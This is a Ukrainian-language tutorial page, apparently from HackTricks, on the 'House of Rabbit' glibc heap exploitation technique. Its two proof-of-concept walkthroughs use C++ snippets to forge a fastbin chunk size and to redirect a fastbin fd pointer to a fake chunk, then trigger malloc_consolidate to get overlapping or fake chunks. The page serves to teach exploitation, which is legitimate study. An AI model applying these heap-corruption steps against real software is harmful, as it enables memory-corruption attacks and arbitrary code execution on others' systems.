# House of Rabbit

{{#include ../../banners/hacktricks-training.md}}

### Вимоги

1. **Здатність змінювати вказівник fd швидкого бін або розмір**: Це означає, що ви можете змінити вказівник вперед для частини в швидкому біні або її розмір.
2. **Здатність викликати `malloc_consolidate`**: Це можна зробити, або виділивши велику частину, або об'єднавши верхню частину, що змушує купу об'єднувати частини.

### Цілі

1. **Створити перекриваючі частини**: Щоб одна частина перекривалася з іншою, що дозволяє подальші маніпуляції з купою.
2. **Підробити фальшиві частини**: Щоб обманути аллокатор, змусивши його вважати фальшиву частину легітимною під час операцій з купою.

## Кроки атаки

### POC 1: Змінити розмір частини швидкого біна

**Мета**: Створити перекриваючу частину, маніпулюючи розміром частини швидкого біна.

- **Крок 1: Виділити частини**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x40);  // Allocates another chunk of 0x40 bytes at 0x602050
malloc(0x10);                          // Allocates a small chunk to change the fastbin state
```
Ми виділяємо два шматки по 0x40 байт кожен. Ці шматки будуть поміщені в список швидких бінів після звільнення.

- **Крок 2: Звільнити шматки**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
free(chunk2);  // Frees the chunk at 0x602050
```
Ми звільняємо обидва шматки, додаючи їх до списку fastbin.

- **Крок 3: Змінити Розмір Шматка**
```cpp
chunk1[-1] = 0xa1;  // Modify the size of chunk1 to 0xa1 (stored just before the chunk at chunk1[-1])
```
Ми змінюємо метадані розміру `chunk1` на 0xa1. Це критично важливий крок, щоб обманути аллокатор під час консолідації.

- **Крок 4: Викликати `malloc_consolidate`**
```cpp
malloc(0x1000);  // Allocate a large chunk to trigger heap consolidation
```
Виділення великого блоку викликає функцію `malloc_consolidate`, об'єднуючи маленькі блоки в швидкому біні. Маніпульований розмір `chunk1` призводить до його перекриття з `chunk2`.

Після консолідації `chunk1` перекривається з `chunk2`, що дозволяє подальшу експлуатацію.

### POC 2: Модифікуйте вказівник `fd`

**Мета**: Створити фейковий блок, маніпулюючи вказівником `fd` швидкого біна.

- **Крок 1: Виділити блоки**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x100); // Allocates a chunk of 0x100 bytes at 0x602050
```
**Пояснення**: Ми виділяємо два шматки, один менший і один більший, щоб налаштувати купу для фейкового шматка.

- **Крок 2: Створити фейковий шматок**
```cpp
chunk2[1] = 0x31;  // Fake chunk size 0x30
chunk2[7] = 0x21;  // Next fake chunk
chunk2[11] = 0x21; // Next-next fake chunk
```
Ми записуємо підроблену метадані частини в `chunk2`, щоб змоделювати менші частини.

- **Крок 3: Вивільнити `chunk1`**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
```
**Пояснення**: Ми звільняємо `chunk1`, додаючи його до списку fastbin.

- **Крок 4: Змінити `fd` `chunk1`**
```cpp
chunk1[0] = 0x602060;  // Modify the fd of chunk1 to point to the fake chunk within chunk2
```
**Пояснення**: Ми змінюємо вказівник вперед (`fd`) `chunk1`, щоб він вказував на наш фейковий шматок всередині `chunk2`.

- **Крок 5: Виклик `malloc_consolidate`**
```cpp
malloc(5000);  // Allocate a large chunk to trigger heap consolidation
```
Виділення великого блоку знову викликає `malloc_consolidate`, який обробляє фейковий блок.

Фейковий блок стає частиною списку fastbin, що робить його легітимним блоком для подальшої експлуатації.

### Резюме

Техніка **House of Rabbit** полягає в модифікації розміру блоку fast bin для створення перекриваючих блоків або маніпуляції вказівником `fd` для створення фейкових блоків. Це дозволяє зловмисникам підробляти легітимні блоки в купі, що відкриває можливості для різних форм експлуатації. Розуміння та практика цих кроків покращить ваші навички експлуатації купи.

{{#include ../../banners/hacktricks-training.md}}
